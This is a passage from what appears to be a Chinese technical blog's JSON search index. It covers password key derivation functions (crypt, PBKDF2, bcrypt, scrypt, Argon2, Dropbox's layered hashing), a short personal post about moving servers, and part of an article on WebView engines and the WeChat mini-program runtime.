通常只需要在登录时被执行一次，因此慢这么一点点完全可以接受，而且用户也完全有足够的资源执行这个 KDF 函数。 但是如果一个黑客想要通过 Hash 碰撞来猜测出用户的密码，那它就必须执行海量的 KDF 计算，这个时候 KDF 的威力就显现出来了 —— 黑客将需要提供海量的 CPU&#x2F;GPU 计算资源、海量的内存资源才能完成目标，而这显然得不偿失，这样 KDF 就确保了用户密码的安全性。</p>\n<p>提升 Hash 算法的碰撞难度，主要从以下三个方向入手：</p>\n<ul>\n<li>时间复杂度：对应 CPU&#x2F;GPU 计算资源</li>\n<li>空间复杂度：对应 Memory 内存资源</li>\n<li>并行维度：使用无法分解的算法，锁定只允许单线程运算</li>\n</ul>\n<h2 id=\"三、主流算法\"><a href=\"#三、主流算法\" class=\"headerlink\" title=\"三、主流算法\"></a>三、主流算法</h2><h3 id=\"1-crypt\"><a href=\"#1-crypt\" class=\"headerlink\" title=\"1. crypt\"></a>1. crypt</h3><p>第一个基于密码的密钥派生函数被称为“ crypt ”（或在其手册页之后的“crypt(3)” ），由 Robert Morris 在 1978 年发明。<br>crypt 算法将加密一个常数（零），使用用户密码的前 8 个字符作为密钥，通过执行修改后的DES加密算法的 25 次迭代（其中使用从实时计算机时钟读取的 12 位数字来干扰计算），生成的 64 位数字被编码为 11 个可打印字符，然后存储在Unix密码文件中。<br>虽然这在当时是一个巨大的进步，但自 PDP-11 以来处理器速度的提高使得针对 crypt 的暴力攻击成为可能，并且 12 位盐的加密强度不足。此外，crypt 函数的设计还将用户密码限制为 8 个字符，这就限制了密钥空间。</p>\n<h3 id=\"2-PBKDF2（Password-Based-Key-Derivation-Function）\"><a href=\"#2-PBKDF2（Password-Based-Key-Derivation-Function）\" class=\"headerlink\" title=\"2. PBKDF2（Password-Based Key Derivation Function）\"></a>2. PBKDF2（Password-Based Key Derivation Function）</h3><p>基本原理是通过一个伪随机函数（例如 HMAC 函数），把明文和一个随机盐作为输入参数，然后重复进行运算，并最终产生密钥。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">DK</span> = <span class=\"title class_\">PBKDF2</span>(<span class=\"variable constant_\">PRF</span>, password, salt, c, dk_len)</span><br></pre></td></tr></table></figure>\n\n<p>其中，PRF 表示使用何种哈希算法（通常是 SHA1 或者 SHA256），password 是人类可读密码，salt 是随机生成的盐（一般不能少于8字节），c 是迭代次数（至少1000次），dk_len 是最终生成的 key 的长度，也就是加密算法的块大小。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/PBKDF2.png\" alt=\"PBKDF2\"></p>\n<p>该算法的优点是标准化，技术实现容易，而且导出密钥的长度本质上是没有限制的，但是其最大有效搜索空间受限于基本伪随机函数的结构。<br>典型应用是 Wi-Fi 的 WPA2 密码保护协议就是采用这个算法，即：<br><code>DK = PBKDF2(HMAC−SHA1, passphrase, ssid, 4096, 256)</code></p>\n<blockquote>\n<p>最近几年比特币挖矿的发展，让大家看到专有硬件、GPU 在对付大规模哈希时的威力。像 PBKDF2 这样简单使用 SHA256，看起来已经不太保险了</p>\n</blockquote>\n<h3 id=\"3-Bcrypt（Blowfish-crypt）\"><a href=\"#3-Bcrypt（Blowfish-crypt）\" class=\"headerlink\" title=\"3. Bcrypt（Blowfish crypt）\"></a>3. Bcrypt（Blowfish crypt）</h3><p>Blowfish（河豚）是一个对称密钥加密的分组密码算法，由布鲁斯·施奈尔于 1993 年设计用于替代陈旧的 DES 算法，强调完全开源，无须授权即可使用。<br>1999年，Niels Provos 和 David Mazières 改进了 Blowfish 算法，通过增加每次迭代的计算开销，达到提升破解难度的目标，并成为 OpenBSD 和许多Linux 发行版（如SUSE Linux）的默认密码哈希算法。</p>\n<p>Bcrypt的工作原理，就是对字符串<code>OrpheanBeholderScryDoubt</code>进行64次 blowfish 加密得到的结果，而用户密码就是该字符串的加密因子之一。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function bcrypt</span><br><span class=\"line\">   Input:</span><br><span class=\"line\">      cost:     Number (<span class=\"number\">4.</span><span class=\"number\">.31</span>)                      log2(Iterations). e.g. <span class=\"number\">12</span> ==&gt; <span class=\"number\">212</span> = <span class=\"number\">4</span>,096 iterations</span><br><span class=\"line\">      salt:     array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">16</span> bytes)</span>           random salt</span><br><span class=\"line\">      password: array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">1.</span><span class=\"number\">.72</span> bytes)</span>        UTF-<span class=\"number\">8</span> encoded password</span><br><span class=\"line\">   Output: </span><br><span class=\"line\">      hash:     array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">24</span> bytes)</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 初始化方法，用于生成 K 数组和 S-box 空间，此步骤非常耗时</span></span><br><span class=\"line\">   <span class=\"comment\">//P: array of 18 subkeys (UInt32[18])</span></span><br><span class=\"line\">   <span class=\"comment\">//S: Four substitution boxes (S-boxes), S0...S3. Each S-box is 1,024 bytes (UInt32[256])</span></span><br><span class=\"line\">   P, S &lt;- EksBlowfishSetup(cost, salt, password)   </span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 基于 24 位初始向量，使用 Blowfish 算法的 ECB 模式，进行 64 轮的迭代加密</span></span><br><span class=\"line\">   ctext &lt;- <span class=\"string\">&quot;OrpheanBeholderScryDoubt&quot;</span>  <span class=\"comment\">//24 bytes ==&gt; three 64-bit blocks</span></span><br><span class=\"line\">   repeat (<span class=\"number\">64</span>)</span><br><span class=\"line\">      ctext &lt;-  EncryptECB(P, S, ctext) <span class=\"comment\">//encrypt using standard Blowfish in ECB mode</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//24-byte ctext is resulting password hash</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span> Concatenate(cost, salt, ctext)</span><br></pre></td></tr></table></figure>\n\n<p>BCrypt算法将 salt 随机并混入最终加密后的密码，形成一个 60 位的 bcrypt hash 密文，因此验证时无需单独提供之前的 salt。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">2a$10<span class=\"variable\">$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy</span></span></span><br><span class=\"line\">\\__/\\/ \\____________________/\\_____________________________/</span><br><span class=\"line\"> Alg Cost      Salt                        Hash</span><br></pre></td></tr></table></figure>\n\n<p>该表示中 <code>$</code> 是各个字段的分隔符，包括：</p>\n<ul>\n<li>2a：  表示的hash算法的唯一标志。这里表示的是bcrypt算法。</li>\n<li>10：  表示的是代价因子，这里是2的10次方，也就是1024轮。</li>\n<li>N9qo8uLOickgx2ZMRZoMye ：             是16个字节的 salt 经过 base64 编码得到的 22 长度的字符</li>\n<li>IjZAgcfl7p92ldGxad68LJZdL17lhWy：     是24个字节的 hash，经过 bash64 的编码得到的 31 长度的字符</li>\n</ul>\n<blockquote>\n<p>Blowfish算法由于分组长度太小已被认为不安全，替代方案是使用 Twofish 密码，有128、192、256位三种密钥长度可供选择，块大小为128位</p>\n</blockquote>\n<h3 id=\"4-Scrypt\"><a href=\"#4-Scrypt\" class=\"headerlink\" title=\"4. Scrypt\"></a>4. Scrypt</h3><p>比特币最最被人诟病的就是它使用的POW算法，谁的算力高，谁就可以挖矿。传统的基于 CPU 计算的算法逐渐被一些特制的 ASIC &#x2F; FPGA 处理器打败，这些专用处理器不做别的，就是破解你的密码或者进行哈希运算，为此科学家们发明了很多其他的算法，比如需要占用大量内存的算法，因为内存不像CPU可以疯狂提速，所以限制了很多暴力破解的场景。</p>\n<p>Scrypt 是一种密码衍生算法，它是由 Colin Percival 创建的，特点是根据初始化的主密码来生成系列的衍生密码，2016年已列入 RFC 7914 标准。<br>Scrypt 内部用的还是 PBKDF2 （Salsa20算法），但会长时间地维护一组非常大的伪随机数序列，用于后续的 key 生成过程中，其算法表达式为：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">DK</span> = <span class=\"title class_\">Scrypt</span>(salt, dk_len, n, r, p)</span><br></pre></td></tr></table></figure>\n\n<p>其中的 salt 是一段随机的盐，dk_len 是输出的哈希值的长度。n 是 CPU&#x2F;Memory 开销值，越高的开销值，计算就越困难。r 表示块大小，p 表示并行度。<br>在高敏感的场景，推荐使用参数为 <code>n = 2 ** 20, r = 8</code>，此时需要消耗 1 GB内存。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function scrypt</span><br><span class=\"line\">   Inputs: This algorithm includes the following parameters:</span><br><span class=\"line\">      Passphrase:                Bytes    string of characters to be hashed</span><br><span class=\"line\">      Salt:                      Bytes    string of random characters that modifies the hash to protect against Rainbow table attacks</span><br><span class=\"line\">      <span class=\"title function_\">CostFactor</span> <span class=\"params\">(N)</span>:            Integer  CPU/memory cost parameter – Must be a power of <span class=\"number\">2</span> (e.g. <span class=\"number\">1024</span>)</span><br><span class=\"line\">      BlockSizeFactor (r):       Integer  blocksize parameter, which fine-tunes sequential memory read size and performance. (<span class=\"number\">8</span> is commonly used)</span><br><span class=\"line\">      ParallelizationFactor (p): Integer  Parallelization parameter. (<span class=\"number\">1</span> .. <span class=\"number\">232</span>-<span class=\"number\">1</span> * hLen/MFlen)</span><br><span class=\"line\">      DesiredKeyLen (dkLen):     Integer  Desired key length in <span class=\"title function_\">bytes</span> <span class=\"params\">(Intended output length in octets of the derived key; a positive integer satisfying dkLen ≤ (<span class=\"number\">232</span>− <span class=\"number\">1</span>)</span> * hLen.)</span><br><span class=\"line\">      hLen:                      Integer  The length in octets of the hash <span class=\"title function_\">function</span> <span class=\"params\">(<span class=\"number\">32</span> <span class=\"keyword\">for</span> SHA256)</span>.</span><br><span class=\"line\">      MFlen:                     Integer  The length in octets of the output of the mixing <span class=\"title function_\">function</span> <span class=\"params\">(SMix below)</span>. Defined as r * <span class=\"number\">128</span> in RFC7914.</span><br><span class=\"line\">   Output:</span><br><span class=\"line\">      DerivedKey:                Bytes    array of bytes, DesiredKeyLen <span class=\"type\">long</span></span><br><span class=\"line\"></span><br><span class=\"line\">   Step <span class=\"number\">1.</span> Generate expensive salt</span><br><span class=\"line\">   blockSize ← <span class=\"number\">128</span>*BlockSizeFactor  <span class=\"comment\">// Length (in bytes) of the SMix mixing function output (e.g. 128*8 = 1024 bytes)</span></span><br><span class=\"line\"></span><br><span class=\"line\">   Use PBKDF2 to generate initial <span class=\"number\">128</span>*BlockSizeFactor*p bytes of <span class=\"title function_\">data</span> <span class=\"params\">(e.g. <span class=\"number\">128</span>*<span class=\"number\">8</span>*<span class=\"number\">3</span> = <span class=\"number\">3072</span> bytes)</span></span><br><span class=\"line\">   Treat the result as an array of p elements, each entry being blocksize <span class=\"title function_\">bytes</span> <span class=\"params\">(e.g. <span class=\"number\">3</span> elements, each <span class=\"number\">1024</span> bytes)</span></span><br><span class=\"line\">   [B0...Bp−<span class=\"number\">1</span>] ← PBKDF2HMAC-SHA256(Passphrase, Salt, <span class=\"number\">1</span>, blockSize*ParallelizationFactor)</span><br><span class=\"line\"></span><br><span class=\"line\">   Mix each block in B Costfactor times using ROMix <span class=\"title function_\">function</span> <span class=\"params\">(each block can be mixed in parallel)</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to p-<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">      Bi ← ROMix(Bi, CostFactor)</span><br><span class=\"line\"></span><br><span class=\"line\">   All the elements of B is our <span class=\"keyword\">new</span> <span class=\"string\">&quot;expensive&quot;</span> salt</span><br><span class=\"line\">   expensiveSalt ← B0∥B1∥B2∥ ... ∥Bp-<span class=\"number\">1</span>  <span class=\"comment\">// where ∥ is concatenation</span></span><br><span class=\"line\"> </span><br><span class=\"line\">   Step <span class=\"number\">2.</span> Use PBKDF2 to generate the desired number of bytes, but using the expensive salt we just generated</span><br><span class=\"line\">   <span class=\"keyword\">return</span> PBKDF2HMAC-SHA256(Passphrase, expensiveSalt, <span class=\"number\">1</span>, DesiredKeyLen);</span><br><span class=\"line\"></span><br><span class=\"line\">Function <span class=\"title function_\">ROMix</span><span class=\"params\">(Block, Iterations)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Create Iterations copies of X</span><br><span class=\"line\">X ← Block</span><br><span class=\"line\"><span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to Iterations−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">   Vi ← X</span><br><span class=\"line\">   X ← BlockMix(X)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to Iterations−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">   j ← Integerify(X) mod Iterations </span><br><span class=\"line\">   X ← BlockMix(X xor Vj)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> X</span><br><span class=\"line\"></span><br><span class=\"line\">Function <span class=\"title function_\">BlockMix</span><span class=\"params\">(B)</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">   The block B is r <span class=\"number\">128</span>-<span class=\"type\">byte</span> <span class=\"title function_\">chunks</span> <span class=\"params\">(which is equivalent of 2r <span class=\"number\">64</span>-<span class=\"type\">byte</span> chunks)</span></span><br><span class=\"line\">   r ← Length(B) / <span class=\"number\">128</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   Treat B as an array of 2r <span class=\"number\">64</span>-<span class=\"type\">byte</span> chunks</span><br><span class=\"line\">   [B0...B2r-<span class=\"number\">1</span>] ← B</span><br><span class=\"line\"></span><br><span class=\"line\">   X ← B2r−<span class=\"number\">1</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to 2r−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">      X ← Salsa20/<span class=\"number\">8</span>(X xor Bi)  <span class=\"comment\">// Salsa20/8 hashes from 64-bytes to 64-bytes</span></span><br><span class=\"line\">      Yi ← X</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> ← Y0∥Y2∥...∥Y2r−<span class=\"number\">2</span> ∥ Y1∥Y3∥...∥Y2r−<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>Scrypt被用在很多新的POW的虚拟货币中，用以表示他们挖矿程序的公平性，比如Tenebrix、 Litecoin 和 Dogecoin等。据说以太坊的 PoW 共识算法也是利用 Scrypt 实现的，但事实上以太坊自己实现了一套哈希算法，叫做 Ethash 。</p>\n<blockquote>\n<p>Scrypt 是一种资源消耗型的算法，但可以灵活地设定使用的内存大小</p>\n</blockquote>\n<h3 id=\"5-Argon2（氩-18号元素）\"><a href=\"#5-Argon2（氩-18号元素）\" class=\"headerlink\" title=\"5. Argon2（氩-18号元素）\"></a>5. Argon2（氩-18号元素）</h3><p>2013 年，NIST（美国国家标准与技术研究院）举办了密码散列竞赛，宣布将选择一种新的标准算法，2015 年 Argon2 被宣布为最终获胜者，其他四种算法获得了特别认可：Catena、Lyra2、Makwa 和 yescrypt。</p>\n<p>Argon2 的设计目标是实现最高的内存填充率和多个计算单元的有效使用，同时仍然提供对（GPU）权衡攻击的防御。<br>Argon2 基于 AES 实现，现代的 x64 和 ARM 处理器已经在指令集扩展中实现了它，从而大大缩小了普通系统和攻击者系统之间的性能差距。</p>\n<p>Argon2 具有三个变体：Argon2i、Argon2d 和 Argon2id。</p>\n<ul>\n<li>Argon2d：速度最快，并且使用依赖于数据的内存访问，是对抗侧信道攻击的最安全选择，适用于加密货币等场景</li>\n<li>Argon2i：使用与数据无关的内存访问，速度最慢，内存消耗高，是抵抗 GPU 破解攻击的最安全选择，适用于密钥派生等场景</li>\n<li>Argon2id：是 Argon2i 和 Argon2d 的混合体，使用了数据依赖和数据无关的内存访问的组合</li>\n</ul>\n<p>下图是最简单的，非并行的Argon2的算法流程。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/argon2.png\" alt=\"Argon2\"><br>以下是使用方法的示例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Inputs</span>:</span><br><span class=\"line\">   password (P):       <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    需要加密的原始信息P</span><br><span class=\"line\">   salt (S):           <span class=\"title class_\">Bytes</span> (<span class=\"number\">8.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    <span class=\"title class_\">Salt</span>盐，建议<span class=\"number\">16</span>个字节</span><br><span class=\"line\">   parallelism (p):    <span class=\"title class_\">Number</span> (<span class=\"number\">1.</span><span class=\"number\">.224</span>-<span class=\"number\">1</span>)   并行程度p，表示同时可以有多少独立的计算链同时运行</span><br><span class=\"line\">   tagLength (T):      <span class=\"title class_\">Number</span> (<span class=\"number\">4.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)   指定返回的<span class=\"title class_\">Tag</span>密文长度</span><br><span class=\"line\">   memorySizeKB (m):   <span class=\"title class_\">Number</span> (8p.<span class=\"number\">.232</span>-<span class=\"number\">1</span>)  内存大小, 单位是<span class=\"variable constant_\">MB</span></span><br><span class=\"line\">   iterations (t):     <span class=\"title class_\">Number</span> (<span class=\"number\">1.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)   迭代器的个数t，用于提升运行速度</span><br><span class=\"line\">   version (v):        <span class=\"title class_\">Number</span> (<span class=\"number\">0x13</span>)       版本号v，一个字节，取值<span class=\"number\">0x13</span></span><br><span class=\"line\">   key (K):            <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    可选的，安全值key (<span class=\"title class_\">Errata</span>: <span class=\"variable constant_\">PDF</span> says <span class=\"number\">0.</span><span class=\"number\">.32</span> bytes, <span class=\"variable constant_\">RFC</span> says <span class=\"number\">0.</span><span class=\"number\">.232</span> bytes)</span><br><span class=\"line\">   associatedData (X): <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    可选的，附件数据</span><br><span class=\"line\">   hashType (y):       <span class=\"title class_\">Number</span> (<span class=\"number\">0</span>=<span class=\"title class_\">Argon2</span>d, <span class=\"number\">1</span>=<span class=\"title class_\">Argon2</span>i, <span class=\"number\">2</span>=<span class=\"title class_\">Argon2</span>id)  <span class=\"title class_\">Argon2</span>的类型</span><br><span class=\"line\"><span class=\"title class_\">Output</span>:</span><br><span class=\"line\">   <span class=\"attr\">tag</span>:                <span class=\"title class_\">Bytes</span> (tagLength)   运算结算密文, 长度是tagLength</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、典型案例：Dropbox-的三层加密策略\"><a href=\"#四、典型案例：Dropbox-的三层加密策略\" class=\"headerlink\" title=\"四、典型案例：Dropbox 的三层加密策略\"></a>四、典型案例：Dropbox 的三层加密策略</h2><p>Dropbox 公司曾公开分享过自己对用户账号的密码加密的策略，使用了三层加密，从里到外就像洋葱一样层层叠加。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/dropbox.png\" alt=\"Dropbox\"></p>\n<ol>\n<li>首先，对明文密码使用 SHA512 散列算法，得到固定长度的 512 字节散列值。<br>某些 Bcrypt 实现可能默认散列值长度为 72 字节，从而降低了密码的熵值；而有的则允许变长密码，容易受到 DoS 攻击。</li>\n<li>然后，针对散列值进行 Bcrypt 再次散列，每个密码都有不同的“盐”，并且是分开存储的<br>Bcrypt 速度比较慢，这样就很难通过硬件加速来加快破解速度。<br>Bcrypt 散列使用了成本因子 10（每个因子相当于每一步计算需要耗费 100 毫秒的时间），这样就更是加大了暴力破解的难度。</li>\n<li>最后，散列值会再次经过 AES256 算法的加密，这次加密会使用到对称秘钥，也就是所谓的“胡椒粉”（pepper）。<br>pepper 与账号数据库分开存储，但所有账号的pepper都是统一的</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.ujcms.com/knowledge/509.html\">密码加密存储技术详解</a></li>\n<li><a href=\"https://www.tomczhen.com/2016/10/10/hashing-security/\">加盐密码哈希：如何正确使用</a></li>\n<li><a href=\"https://blog.csdn.net/HORHEART/article/details/119968850\">PBKDF2算法原理</a></li>\n<li><a href=\"https://crackstation.net/hashing-security.htm\">Salted Password Hashing - Doing it Right</a></li>\n<li><a href=\"https://www.ujcms.com/knowledge/509.html\">密码加密存储技术详解</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1888720\">密码学系列之:加密货币中的scrypt算法</a></li>\n<li><a href=\"http://www.tarsnap.com/scrypt/scrypt.pdf\">Colin Percival 关于 Scrypt 的原始论文</a></li>\n<li><a href=\"https://www.rfc-editor.org/rfc/rfc7914\">Scrypt - RFC 7914 官方文档</a></li>\n<li><a href=\"https://github.com/P-H-C/phc-winner-argon2/blob/master/argon2-specs.pdf\">Argon2 的技术白皮书 - 英文</a></li>\n<li><a href=\"https://github.com/p-h-c/phc-winner-argon2\">Argon2 的参考 C 实现 - Github</a></li>\n<li><a href=\"https://www.11meigui.com/2020/rainbow-table.html\">什么是彩虹表 Rainbow Table</a></li>\n</ul>\n"},{"title":"搬家了","url":"/2019/01/17/%E6%90%AC%E5%AE%B6%E4%BA%86/","content":"<p>已经是2019年了！<br>从兰州搬家，终于回到了北京！</p>\n<p>阿里云的香港ECS到期了，续费太贵，就把域名搬到了成都的腾讯云！<br>效果还不错，就是不得不做了域名备案。</p>\n"},{"title":"微信小程序的运行态环境","url":"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/","content":"<h2 id=\"WebKit的发展历程\"><a href=\"#WebKit的发展历程\" class=\"headerlink\" title=\"WebKit的发展历程\"></a>WebKit的发展历程</h2><blockquote>\n<p>粗略地说，Webkit &#x3D; WebCore + JavaScriptCore， Chromimum &#x3D; Blink + V8</p>\n</blockquote>\n<p>1998，自由软件社区KDE开发了HTML渲染引擎KHTML和JavaScript解析引擎KJS，也就是现代浏览器两个重要的引擎，其中：</p>\n<ul>\n<li>渲染引擎(layout engineer 或者 Rendering Engine)<br>  负责渲染引擎负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。</li>\n<li>JS 引擎<br>  负责解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。</li>\n</ul>\n<p>当时还存在多个浏览器内核相互竞争，包括：Trident（IE），Gecko（firefox），Webkit（Safari chrome 等）以及 Presto（opera)。</p>\n<p>2001年，Apple公司的开发者Don Melton于在KDE的基础之上开始了WebKit项目，KHTML被命名为<code>WebCore</code>，KJS被命名为<code>JavaScriptCore</code>。因此，对于Apple的产品来说，浏览器内核就是WebKit，即渲染引擎采用的是WebKit内核。</p>\n<p>2008年，Google为发展浏览器<code>Google Chrome</code>而开启了免费开源软件项目<code>Chromium</code>，其JavaScript解析引擎采用Google自己开发的大名鼎鼎的<code>V8</code>引擎，渲染引擎仍然采用WebKit内核。Google使用<code>Chromium</code>代码来制作其Chrome浏览器，该浏览器比Chromium具有更多功能。。</p>\n<p>2013年，<code>Chromium</code>项目将渲染引擎替换为<code>Blink</code>引擎，并在Chrome28及后续的版本上采用。随后 opera 则放弃了自主研发的 Presto 引擎，投入谷歌怀抱，和谷歌一起研发 blink 引擎，国内各种 chrome系的浏览器（360、UC、QQ、百度等等）也纷纷放弃 webkit，投入 blink 的怀抱。</p>\n<p>2018年，微软宣布Microsoft Edge未来也将基于Chromium开发。</p>\n<img src=\"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/webkit.gif\" class=\"\">\n\n<h2 id=\"WebView是什么\"><a href=\"#WebView是什么\" class=\"headerlink\" title=\"WebView是什么\"></a>WebView是什么</h2><p>WebView是一个基于webkit引擎、展现web页面的控件，是iOS SDK或Android SDK的一个重要组件，其本质就是一个高性能webkit内核浏览器。</p>\n<p>WebView的功能主要包括：</p>\n<ul>\n<li>显示和渲染Web页面</li>\n<li>直接使用html文件（网络上或本地assets中）作布局</li>\n<li>与JavaScript交互调用</li>\n</ul>\n<h3 id=\"iOS、MacOS的WebView\"><a href=\"#iOS、MacOS的WebView\" class=\"headerlink\" title=\"iOS、MacOS的WebView\"></a>iOS、MacOS的WebView</h3><p>顾名思义，WebView是与浏览器密切相关的开发组件。Apple作为封闭型生态系统，Safri是默认浏览器，iOS APP的WebView也是其强制标准，应用开发者完全没有选择权。</p>\n<ul>\n<li><code>UIWebView</code>是Apple在iOS 2推出的“老”资格页面渲染引擎。</li>\n<li>从iOS 8起，Apple推出了<code>WKWebView</code>，并作为Safri的默认渲染引擎，但开发者也可以通过<code>manifest</code>配置项选择使用<code>UIWebView</code>。</li>\n<li>从iOS 13起，Apple将<code>UIWebView</code>列入非公开api，2020年4月起App Store将不再接受使用UIWebView的新App上架、2020年12月起将不再接受使用UIWebView的App更新。</li>\n</ul>\n<p>相比<code>UIWebView</code>来说，<code>WKWebView</code>的性能更好，节省内存，支持了更多的 HTML5 特性。<br>此外，存在的主要缺陷有：</p>\n<ul>\n<li>不支持websql（iOS8、9上不支持，iOS10恢复支持）</li>\n<li>不支持plus.navigator.setCookie</li>\n<li>不支持webview的overrideresource方法</li>\n<li>不支持js原生加密</li>\n<li>在联网及本地文件读取等有各种跨域限制、</li>\n</ul>\n<h3 id=\"Android终端的WebView\"><a href=\"#Android终端的WebView\" class=\"headerlink\" title=\"Android终端的WebView\"></a>Android终端的WebView</h3><p>Android Webview的进化历史如下：</p>\n<ul>\n<li>Android 4.4以前，自带WebView是Android webkit 内核，很多HTML5标准语法不支持，比如indexeddb、webgl等，canvas性能非常差</li>\n<li>从Android4.4系统开始，自带WebView变成了chromium 30内核，Chromium内核（Blind + V8）取代了Webkit内核</li>\n<li>从Android5.0系统开始，webview脱离ROM可单独更新，成为一个独立的apk，可以不依赖系统而独立存在和更新。</li>\n<li>从Android7.0 系统开始，如果用户手机里安装了 Chrome ， 系统优先选择 Chrome 为应用提供 WebView 渲染。</li>\n<li>从Android8.0系统开始，默认开启WebView多进程模式，即WebView运行在独立的沙盒进程中。</li>\n</ul>\n<p>Android作为开放式生态系统，尽管Chrome是默认浏览器，但由于其内核是Chromium，其开发SDK也能支持第三方Chrome家族浏览器。<br>由于政策环境的影响，几乎所有国产品牌Android都提供自己的浏览器（虽然都是基于Chrominum内核），从chrome 37一直跨度到60，手机用户侧使用了到底是哪个版本是不一定的，因此WebView的运行环境就很复杂了</p>\n<h3 id=\"Window终端的WebView\"><a href=\"#Window终端的WebView\" class=\"headerlink\" title=\"Window终端的WebView\"></a>Window终端的WebView</h3><p>在很长一段时间里，Windows 10用户对 Microsoft Edge 的印象都停留在「Chrome 下载器」这个层面上，即便 Edge 本身相比 Internet Explorer 有着诸多优点，孱弱的扩展生态和巨大的迁移难度还是让不少用户望而却步。</p>\n<p>2018 年年底，基于 Chromium 内核的 Microsoft Edge 正式立项。微软的壳、Chromium 的心， 微软彻底放弃自己开发的EdgeHTML内核，解决 Edge 一直以来都难以解决的兼容性问题（在 EdgeHTML 下不少传统网页都无法正常显示）并融入现有的 Chromium 生态。</p>\n<p>因此，Window Client的WebView至此已经与Chromium完全一致了！！！</p>\n<h2 id=\"微信小程序的Runtime\"><a href=\"#微信小程序的Runtime\" class=\"headerlink\" title=\"微信小程序的Runtime\"></a>微信小程序的Runtime</h2><p>小程序无论从技术上还是从理念上都不是一个新事物：从技术上讲，它借用了React Native的一些概念，定义了一套微信自有的组件并根据运行环境的不同（PC、iOS、Android）将这些组件编译&#x2F;转化为对应平台的可运行组件；从理念上讲，百度早年的“轻应用”、QQ右下角的“应用宝”还有支付宝里的各类小服务，早已是小程序的雏形。</p>\n<h3 id=\"小程序的宿主环境\"><a href=\"#小程序的宿主环境\" class=\"headerlink\" title=\"小程序的宿主环境\"></a>小程序的宿主环境</h3><p>小程序的主要开发语言是 JavaScript，其开发模式与 web 开发类似，都是使用 javascript 进行开发，使用 css 控制样式，最终渲染使用 html 进行渲染。</p>\n<p>在小程序中，渲染层通常与逻辑层分离。</p>\n<ul>\n<li>渲染层<br>  <code>WXML</code>模板和<code>WXSS</code>样式工作在渲染层。渲染层的界面使用了WebView 进行渲染。<br>  由于一个小程序通常存在多个界面，所以渲染层可能使用多个WebView线程<br>  View 负责渲染小程序页面，包括 Web 组件和原生组件渲染，可以将其视为混合渲染。例如，Web 组件渲染可以由 WebView 处理，但 WebView 不支持某些 Web 